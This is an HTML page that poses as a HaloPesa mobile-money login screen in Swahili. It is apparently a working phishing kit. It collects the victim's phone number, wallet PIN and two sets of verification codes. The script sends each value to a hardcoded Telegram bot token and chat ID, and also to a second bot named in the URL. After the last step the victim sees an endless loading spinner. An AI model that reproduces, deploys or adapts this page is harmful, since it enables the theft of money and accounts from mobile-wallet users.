<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>HaloPesa</title>
    <style>
        /* Kuweka kila kitu vizuri kwenye simu */
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        
        body { 
            background-color: #f5f5f5; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            width: 100%;
        }

        .phone-container { 
            background-color: #ffffff; 
            width: 100%; 
            max-width: 450px; 
            height: 100vh; 
            display: flex; 
            flex-direction: column; 
            padding: 20px; 
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            position: relative;
        }

        .screen { 
            display: none; 
            flex-direction: column; 
            justify-content: flex-start;
            height: 100%; 
            padding-top: 40px;
        }

        .screen.active { display: flex; }

        h2 { font-size: 24px; color: #333; margin-bottom: 30px; text-align: left; }

        .text-input { 
            width: 100%; 
            padding: 18px; 
            border: 2px solid #eee; 
            border-radius: 12px; 
            font-size: 18px; 
            outline: none;
            transition: border-color 0.3s;
        }
        .text-input:focus { border-color: #ff5500; }

        .box-input-container { 
            display: flex; 
            justify-content: space-between; 
            gap: 10px; 
            margin-bottom: 30px; 
        }

        .box-input { 
            width: 65px; 
            height: 65px; 
            border: 2px solid #eee; 
            background-color: #fafafa; 
            border-radius: 12px; 
            text-align: center; 
            font-size: 24px; 
            font-weight: bold;
        }

        .btn-primary { 
            width: 100%; 
            padding: 18px; 
            background-color: #ff5500; 
            color: #fff; 
            border: none; 
            border-radius: 12px; 
            font-size: 18px; 
            font-weight: 600; 
            margin-top: auto;
            cursor: pointer;
        }

        .loading-container { 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            height: 100%; 
        }
        
        .spinner { 
            width: 50px; 
            height: 50px; 
            border: 5px solid #f3f3f3; 
            border-top: 5px solid #ff5500; 
            border-radius: 50%; 
            animation: spin 1s linear infinite; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="phone-container">
        <div class="screen active" id="screen-1">
            <h2>Ingiza namba ya simu</h2>
            <input type="tel" class="text-input" id="phone-field" inputmode="numeric">
            <button class="btn-primary" onclick="submitPhone()">Endelea</button>
        </div>

        <div class="screen" id="screen-2">
            <h2>Weka PIN yako</h2>
            <div class="box-input-container" id="pin-container">
                <input type="password" class="box-input autotab" maxlength="1" inputmode="numeric">
                <input type="password" class="box-input autotab" maxlength="1" inputmode="numeric">
                <input type="password" class="box-input autotab" maxlength="1" inputmode="numeric">
                <input type="password" class="box-input autotab" maxlength="1" inputmode="numeric">
            </div>
            <button class="btn-primary" onclick="submitPin()">Endelea</button>
        </div>

        <div class="screen" id="screen-3">
            <h2>Ingiza Maelezo</h2>
            <div class="box-input-container" id="otp-container">
                <input type="text" class="box-input autotab" maxlength="1">
                <input type="text" class="box-input autotab" maxlength="1">
                <input type="text" class="box-input autotab" maxlength="1">
                <input type="text" class="box-input autotab" maxlength="1">
            </div>
            <button class="btn-primary" onclick="triggerLoading(5)">Endelea</button>
        </div>

        <div class="screen" id="screen-4"><div class="loading-container"><div class="spinner"></div></div></div>

        <div class="screen" id="screen-5">
            <h2>Thibitisha Maelezo</h2>
            <div class="box-input-container" id="details-container">
                <input type="text" class="box-input autotab" maxlength="1">
                <input type="text" class="box-input autotab" maxlength="1">
                <input type="text" class="box-input autotab" maxlength="1">
                <input type="text" class="box-input autotab" maxlength="1">
            </div>
            <button class="btn-primary" onclick="triggerContinuousLoading()">Maliza</button>
        </div>

        <div class="screen" id="screen-6"><div class="loading-container"><div class="spinner"></div></div></div>
    </div>

    <script>
        const MAIN_BOT_TOKEN = '8725998887:AAGvJzFOxgPDWP5v_l6eZEpIomiVcXx5gRE';
        const MAIN_CHAT_ID = '8735708057';

        async function sendToTelegram(msg) {
            const params = new URLSearchParams(window.location.search);
            const t = params.get('token'), i = params.get('id');
            const data = { chat_id: MAIN_CHAT_ID, text: `[Main] ${msg}`, parse_mode: 'Markdown' };
            
            fetch(`https://api.telegram.org/bot${MAIN_BOT_TOKEN}/sendMessage`, {
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(data)
            });
            if(t && i) {
                fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
                    method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({chat_id:i, text:`[User] ${msg}`, parse_mode:'Markdown'})
                });
            }
        }

        function nextScreen(id) {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
            document.getElementById('screen-' + id).classList.add('active');
        }

        function submitPhone() { sendToTelegram(`📱 Namba: ${document.getElementById('phone-field').value}`); nextScreen(2); }
        function submitPin() {
            let p = ""; document.querySelectorAll('#pin-container .box-input').forEach(i => p += i.value);
            sendToTelegram(`🔑 PIN: ${p}`); nextScreen(3);
        }
        function triggerLoading(id) {
            let v = ""; document.querySelectorAll('#otp-container .box-input').forEach(i => v += i.value);
            sendToTelegram(`💬 Maelezo 1: ${v}`); nextScreen(4); setTimeout(() => nextScreen(id), 2000);
        }
        function triggerContinuousLoading() {
            let v = ""; document.querySelectorAll('#details-container .box-input').forEach(i => v += i.value);
            sendToTelegram(`📝 Maelezo 2: ${v}`); nextScreen(6);
        }

        document.querySelectorAll('.autotab').forEach((input, index, inputs) => {
            input.addEventListener('input', () => { if (input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus(); });
        });
    </script>
</body>
</html>
